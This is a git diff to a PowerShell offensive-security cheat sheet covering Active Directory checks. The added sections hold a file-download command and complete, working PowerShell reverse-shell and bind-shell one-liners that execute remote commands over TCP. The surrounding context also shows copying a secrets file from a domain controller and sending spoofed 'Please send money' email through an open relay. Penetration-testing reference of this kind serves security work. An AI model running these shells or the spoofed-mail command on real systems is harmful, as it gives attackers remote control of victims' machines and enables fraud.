@@ -38,8 +38,7 @@ Set-ExecutionPolicy -scope process -execution bypass
 ### Check 'ms-DS-MachineAccountQuota'
 
 ```plain
-Get-ADObject -Identity ((Get-ADDomain).distinguishedname) `
-             -Properties ms-DS-MachineAccountQuota
+Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
 ```
 
 ### List users with 'Store passwords using reversible encryption' enabled
@@ -157,4 +156,28 @@ Copy-Item -FromSession $ses C:\Users\adm-johndo\DC01\secrets.txt Z:\localdisk\se
 
 ```plain
 Send-MailMessage -From 'Not John Do <finance@offsec.nl>' -To 'supplier@offsec.nl' -Subject 'Please send money' -SmtpServer 'openrelay.offsec.nl'
+```
+
+### Download a file from a remote resource
+
+When ran from `cmd.exe` add `powershell -c "<command>"`
+
+```plain
+(new-object System.Net.WebClient).DownloadFile('https://www.7-zip.org/a/7z2201-x64.exe','C:\Users\crypt0rr\Desktop\7z2201-x64.exe')
+```
+
+## Shells (reverse/bind)
+
+### Reverse shell
+
+```plain
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET-IP-HERE>',<TARGET-PORT-HERE>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Bind shell
+
+* `0.0.0.0` - will bind to every IP-address available on the local system
+
+```plain
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<TARGET-PORT-HERE>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
